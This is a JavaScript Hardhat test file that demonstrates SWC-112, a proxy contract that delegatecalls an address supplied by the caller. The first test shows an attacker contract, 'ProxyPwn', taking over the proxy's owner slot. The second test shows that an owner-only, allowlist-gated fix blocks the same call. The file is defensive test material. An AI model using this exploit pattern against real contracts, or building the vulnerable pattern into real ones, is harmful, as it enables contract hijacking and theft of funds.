const { expect } = require("chai");
const { ethers } = require("hardhat");

// SWC-112 — delegatecall to a caller-supplied address.
describe("Proxy delegatecall (SWC-112)", function () {
  const SLOT0 = 0; // Proxy.owner lives in storage slot 0

  async function ownerSlot(addr) {
    const raw = await ethers.provider.getStorage(addr, SLOT0);
    return ethers.getAddress("0x" + raw.slice(-40));
  }

  it("VULNERABLE: attacker overwrites owner via a delegatecall payload", async function () {
    const [deployer, attacker] = await ethers.getSigners();

    const Proxy = await ethers.getContractFactory("contracts/vulnerable/Proxy.sol:Proxy");
    const proxy = await Proxy.deploy();
    await proxy.waitForDeployment();
    const proxyAddr = await proxy.getAddress();
    expect(await ownerSlot(proxyAddr)).to.equal(deployer.address);

    const Pwn = await ethers.getContractFactory("contracts/attack/ProxyPwn.sol:ProxyPwn");
    const pwn = await Pwn.deploy();
    await pwn.waitForDeployment();

    const data = pwn.interface.encodeFunctionData("pwn");
    await proxy.connect(attacker).forward(await pwn.getAddress(), data);

    // Proxy's owner slot has been hijacked.
    expect(await ownerSlot(proxyAddr)).to.equal(attacker.address);
  });

  it("FIXED: forward is owner-only and allowlist-gated", async function () {
    const [deployer, attacker] = await ethers.getSigners();

    const Proxy = await ethers.getContractFactory("contracts/fixed/Proxy.sol:Proxy");
    const proxy = await Proxy.deploy();
    await proxy.waitForDeployment();

    const Pwn = await ethers.getContractFactory("contracts/attack/ProxyPwn.sol:ProxyPwn");
    const pwn = await Pwn.deploy();
    await pwn.waitForDeployment();
    const data = pwn.interface.encodeFunctionData("pwn");

    // Attacker cannot call forward at all.
    await expect(
      proxy.connect(attacker).forward(await pwn.getAddress(), data)
    ).to.be.reverted;

    // Even the owner must allowlist a callee first; an un-vetted one reverts.
    await expect(
      proxy.connect(deployer).forward(await pwn.getAddress(), data)
    ).to.be.reverted;
  });
});
